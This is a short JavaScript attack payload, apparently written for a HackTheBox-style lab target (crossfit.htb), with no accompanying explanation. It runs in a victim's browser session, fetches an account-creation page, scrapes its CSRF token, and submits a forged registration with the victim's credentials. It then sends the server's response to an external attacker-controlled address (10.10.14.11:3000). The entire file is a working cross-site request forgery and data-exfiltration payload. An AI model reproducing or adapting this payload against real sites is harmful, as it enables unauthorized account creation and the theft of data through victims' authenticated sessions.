function get_token(body) {
    var dom = new DOMParser().parseFromString(body, 'text/html');
    return dom.getElementsByName('_token')[0].value;
}


var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if (fetch_req.readyState == XMLHttpRequest.DONE) {
        var token = get_token(fetch_req.response);

        var reg_req = new XMLHttpRequest();
        reg_req.onreadystatechange = function() {
            if (reg_req.readyState == XMLHttpRequest.DONE) {
                var exfil_req = new XMLHttpRequest();
                exfil_req.open("POST", "http://10.10.14.11:3000/", false);
                exfil_req.send(reg_req.response);
            }
        };
        reg_req.open("POST", "http://ftp.crossfit.htb/accounts", false);
        reg_req.withCredentials = true;
        reg_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        reg_req.send("_token=" + token + "&username=0xdf&pass=0xdf0xdf");
    }
};

fetch_req.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
fetch_req.withCredentials = true;
fetch_req.send();

//
//
